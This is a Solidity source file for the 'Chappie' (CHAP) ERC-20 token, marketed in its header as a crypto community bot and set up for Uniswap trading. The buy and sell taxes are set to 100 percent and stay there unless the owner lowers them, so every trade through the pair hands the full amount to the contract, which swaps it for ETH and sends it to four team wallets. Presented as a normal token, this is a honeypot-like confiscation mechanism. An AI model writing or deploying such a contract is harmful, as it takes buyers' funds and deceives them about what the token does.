1 // SPDX-License-Identifier: MIT
2 /**
3 
4 Chappie | CHAP
5 
6 World's First 24/7 Crypto Community Bot
7 - 24/7 Learning & Real-time Engagement
8 - Intuitive Learning Amplifier
9 - Interactive Storytelling at its Best
10 - Robust Data Interpreter
11 
12 Check us out here:
13 Twitter: https://twitter.com/ChappieCM 
14 Telegram: https://t.me/ChappieCM 
15 Website: https://www.chappie.io 
16 
17 **/
18 pragma solidity 0.8.20;
19 
20 abstract contract Context {
21     function _msgSender() internal view virtual returns (address) {
22         return msg.sender;
23     }
24 }
25 
26 interface IERC20 {
27     function totalSupply() external view returns (uint256);
28     function balanceOf(address account) external view returns (uint256);
29     function transfer(address recipient, uint256 amount) external returns (bool);
30     function allowance(address owner, address spender) external view returns (uint256);
31     function approve(address spender, uint256 amount) external returns (bool);
32     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
33     event Transfer(address indexed from, address indexed to, uint256 value);
34     event Approval(address indexed owner, address indexed spender, uint256 value);
35 }
36 
37 library SafeMath {
38     function add(uint256 a, uint256 b) internal pure returns (uint256) {
39         uint256 c = a + b;
40         require(c >= a, "SafeMath: addition overflow");
41         return c;
42     }
43 
44     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
45         return sub(a, b, "SafeMath: subtraction overflow");
46     }
47 
48     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
49         require(b <= a, errorMessage);
50         uint256 c = a - b;
51         return c;
52     }
53 
54     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
55         if (a == 0) {
56             return 0;
57         }
58         uint256 c = a * b;
59         require(c / a == b, "SafeMath: multiplication overflow");
60         return c;
61     }
62 
63     function div(uint256 a, uint256 b) internal pure returns (uint256) {
64         return div(a, b, "SafeMath: division by zero");
65     }
66 
67     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
68         require(b > 0, errorMessage);
69         uint256 c = a / b;
70         return c;
71     }
72 
73 }
74 
75 contract Ownable is Context {
76     address private _owner;
77     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
78 
79     constructor () {
80         address msgSender = _msgSender();
81         _owner = msgSender;
82         emit OwnershipTransferred(address(0), msgSender);
83     }
84 
85     function owner() public view returns (address) {
86         return _owner;
87     }
88 
89     modifier onlyOwner() {
90         require(_owner == _msgSender(), "Ownable: caller is not the owner");
91         _;
92     }
93 
94     function renounceOwnership() public virtual onlyOwner {
95         emit OwnershipTransferred(_owner, address(0));
96         _owner = address(0);
97     }
98 
99 }
100 
101 interface IUniswapV2Factory {
102     function createPair(address tokenA, address tokenB) external returns (address pair);
103     function getPair(address tokenA, address tokenB) external view returns (address pair);
104 }
105 
106 interface IUniswapV2Router02 {
107     function swapExactTokensForETHSupportingFeeOnTransferTokens(
108         uint amountIn,
109         uint amountOutMin,
110         address[] calldata path,
111         address to,
112         uint deadline
113     ) external;
114     function factory() external pure returns (address);
115     function WETH() external pure returns (address);
116     function addLiquidityETH(
117         address token,
118         uint amountTokenDesired,
119         uint amountTokenMin,
120         uint amountETHMin,
121         address to,
122         uint deadline
123     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
124 }
125 
126 contract Chappie is Context, IERC20, Ownable {
127     using SafeMath for uint256;
128     mapping (address => uint256) private _balances;
129     mapping (address => mapping (address => uint256)) private _allowances;
130     mapping (address => bool) private _isExcludedFromFee;
131     mapping(address => uint256) private _holderLastTransferTimestamp;
132     bool public transferDelayEnabled = false;
133     address payable private _mainWallet;
134     address payable private _taxTeamWallet;
135     address payable private _taxStakingsWallet;
136     address payable private _taxEcosystemkWallet;
137     address payable private _taxMarketingWallet;
138 
139     uint256 private _initialBuyTax=100;
140     uint256 private _initialSellTax=100;
141     uint256 public _currentBuyTax=100;   //reduce tax after marketing
142     uint256 public _currentSellTax=100; //reduce tax after marketing
143     uint256 private _reduceBuyTaxAt=0;
144     uint256 private _reduceSellTaxAt=0;
145     uint256 private _preventSwapBefore=1;
146     uint256 private _buyCount=0;
147 
148     uint8 private constant _decimals = 0;
149     uint256 private constant _tTotal = 1000000000 * 10**_decimals;
150     string private constant _name = unicode"Chappie";
151     string private constant _symbol = unicode"CHAP";
152     uint256 public _maxTxAmount =   10000000 * 10**_decimals;
153     uint256 public _maxWalletSize = 10000000 * 10**_decimals;
154     uint256 public _taxSwapThreshold=0 * 10**_decimals;
155     uint256 public _maxTaxSwap=10000000 * 10**_decimals;
156 
157     IUniswapV2Router02 private uniswapV2Router;
158     address private uniswapV2Pair;
159     bool private tradingOpen;
160     bool private inSwap = false;
161     bool private swapEnabled = false;
162 
163     event MaxTxAmountUpdated(uint _maxTxAmount);
164     modifier lockTheSwap {
165         inSwap = true;
166         _;
167         inSwap = false;
168     }
169 
170     constructor () {
171         _taxTeamWallet = payable(0x074e1aF5C0E37D2197614a74B3762C6179ecDf15);
172         _taxStakingsWallet = payable(0xE78B81F6Ab8f422501bF27ab7Bdf0A49557C5E50);
173         _taxEcosystemkWallet = payable(0xA74C6a9A8AE3a8850BEABa73A2c7df9E72070088);
174         _taxMarketingWallet = payable(0x519297f95D5C1b7Ee4b1e63DF3D4Ee74b608a87d);
175         _mainWallet = payable(0x905e6245B7cb0fc9ea44f3d94D103C42044ce6F2);
176 
177         _balances[_msgSender()] = _tTotal;
178         _isExcludedFromFee[owner()] = true;
179         _isExcludedFromFee[address(this)] = true;
180         _isExcludedFromFee[_taxTeamWallet] = true;
181         _isExcludedFromFee[_taxStakingsWallet] = true;
182         _isExcludedFromFee[_taxEcosystemkWallet] = true;
183         _isExcludedFromFee[_taxMarketingWallet] = true;
184         _isExcludedFromFee[_mainWallet] = true;
185 
186         emit Transfer(address(0), _msgSender(), _tTotal);
187     }
188 
189     function name() public pure returns (string memory) {
190         return _name;
191     }
192 
193     function symbol() public pure returns (string memory) {
194         return _symbol;
195     }
196 
197     function decimals() public pure returns (uint8) {
198         return _decimals;
199     }
200 
201     function totalSupply() public pure override returns (uint256) {
202         return _tTotal;
203     }
204 
205     function balanceOf(address account) public view override returns (uint256) {
206         return _balances[account];
207     }
208 
209     function transfer(address recipient, uint256 amount) public override returns (bool) {
210         _transfer(_msgSender(), recipient, amount);
211         return true;
212     }
213 
214     function allowance(address owner, address spender) public view override returns (uint256) {
215         return _allowances[owner][spender];
216     }
217 
218     function approve(address spender, uint256 amount) public override returns (bool) {
219         _approve(_msgSender(), spender, amount);
220         return true;
221     }
222 
223     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
224         _transfer(sender, recipient, amount);
225         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
226         return true;
227     }
228 
229     function _approve(address owner, address spender, uint256 amount) private {
230         require(owner != address(0), "ERC20: approve from the zero address");
231         require(spender != address(0), "ERC20: approve to the zero address");
232         _allowances[owner][spender] = amount;
233         emit Approval(owner, spender, amount);
234     }
235 
236     function _transfer(address from, address to, uint256 amount) private {
237         require(from != address(0), "ERC20: transfer from the zero address");
238         require(to != address(0), "ERC20: transfer to the zero address");
239         require(amount > 0, "Transfer amount must be greater than zero");
240         uint256 taxAmount=0;
241         if (from != owner() && to != owner()) {
242 
243             if (transferDelayEnabled) {
244               if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
245                 require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
246                 _holderLastTransferTimestamp[tx.origin] = block.number;
247               }
248             }
249 
250             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
251                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
252                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
253                 taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_currentBuyTax:_initialBuyTax).div(100);
254                 _buyCount++;
255             }
256 
257             if(to == uniswapV2Pair && from!= address(this) ){
258                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
259                 taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_currentSellTax:_initialSellTax).div(100);
260             }
261 
262             uint256 contractTokenBalance = balanceOf(address(this));
263             if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
264                 swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
265                 uint256 contractETHBalance = address(this).balance;
266                 if(contractETHBalance > 0) {
267                     sendETHToFee(address(this).balance);
268                 }
269             }
270         }
271 
272         if(taxAmount>0){
273           _balances[address(this)]=_balances[address(this)].add(taxAmount);
274           emit Transfer(from, address(this),taxAmount);
275         }
276         _balances[from]=_balances[from].sub(amount);
277         _balances[to]=_balances[to].add(amount.sub(taxAmount));
278         emit Transfer(from, to, amount.sub(taxAmount));
279     }
280 
281 
282     function min(uint256 a, uint256 b) private pure returns (uint256){
283       return (a>b)?b:a;
284     }
285 
286     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
287         if(tokenAmount==0){return;}
288         if(!tradingOpen){return;}
289         address[] memory path = new address[](2);
290         path[0] = address(this);
291         path[1] = uniswapV2Router.WETH();
292         _approve(address(this), address(uniswapV2Router), tokenAmount);
293         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
294             tokenAmount,
295             0,
296             path,
297             address(this),
298             block.timestamp
299         );
300     }
301 
302     function removeLimits() external onlyOwner{
303         _maxTxAmount = _tTotal;
304         _maxWalletSize=_tTotal;
305         transferDelayEnabled=false;
306         emit MaxTxAmountUpdated(_tTotal);
307     }
308 
309     function sendETHToFee(uint256 amount) private {
310         uint256 feeAmount = amount.mul(25).div(100);
311         uint256 remaining = amount.sub(feeAmount).sub(feeAmount).sub(feeAmount);
312         _taxTeamWallet.transfer(feeAmount);
313         _taxStakingsWallet.transfer(feeAmount);
314         _taxEcosystemkWallet.transfer(feeAmount);
315         _taxMarketingWallet.transfer(remaining);
316     }
317 
318     function openTrading() external onlyOwner() {
319         require(!tradingOpen,"trading is already open");
320         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
321         _approve(address(this), address(uniswapV2Router), _tTotal);
322         IUniswapV2Factory factory=IUniswapV2Factory(uniswapV2Router.factory());
323         uniswapV2Pair = factory.getPair(address(this),uniswapV2Router.WETH());
324         if(uniswapV2Pair==address(0x0)){
325           uniswapV2Pair = factory.createPair(address(this), uniswapV2Router.WETH());
326         }
327         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
328         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
329         swapEnabled = true;
330         tradingOpen = true;
331     }
332 
333     receive() external payable {}
334 
335     function isContract(address account) private view returns (bool) {
336         uint256 size;
337         assembly {
338             size := extcodesize(account)
339         }
340         return size > 0;
341     }
342 
343     function reduceFee(uint256 _newBuyFee, uint256 _newSellFee) external onlyOwner(){
344       require(_newBuyFee<=_currentBuyTax && _newSellFee<=_currentSellTax);
345       _currentBuyTax=_newBuyFee;
346       _currentSellTax=_newSellFee;
347     }
348     
349 }